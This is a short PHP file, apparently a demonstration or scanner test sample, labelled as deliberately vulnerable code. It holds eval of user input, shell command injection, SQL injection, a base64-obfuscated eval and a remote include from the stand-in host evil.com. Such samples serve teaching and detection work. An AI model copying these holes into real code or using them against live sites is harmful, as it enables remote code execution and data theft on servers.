<?php
/**
 * Example: PHP code injection vulnerability
 * This is MALICIOUS/VULNERABLE CODE - for demonstration only!
 */

// Dangerous: Direct use of user input in eval
$user_input = $_GET['code'];
eval($user_input);  // CRITICAL VULNERABILITY

// Dangerous: Command injection
$filename = $_POST['file'];
system("cat " . $filename);  // Command injection

// Dangerous: SQL injection
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
mysql_query($query);  // SQL injection

// Obfuscated malicious code
$encoded = base64_decode('ZWNobyAiSGFja2VkISI7');
eval($encoded);

// Remote file inclusion
$page = $_GET['page'];
include("http://evil.com/" . $page . ".php");

?>
